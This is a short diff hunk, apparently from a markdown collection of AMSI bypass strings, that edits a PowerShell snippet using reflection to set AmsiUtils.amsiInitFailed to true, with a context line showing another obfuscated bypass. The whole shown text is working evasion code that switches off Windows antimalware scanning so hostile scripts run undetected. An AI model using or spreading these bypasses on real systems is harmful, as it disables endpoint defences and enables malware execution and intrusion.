@@ -52,8 +52,8 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 ```
 
 ```
-$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils');
-$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
+$v=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+$v."Get`Fie`ld"('amsiInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
 ```
 
 #### AMSI bypass string 2 obfuscated
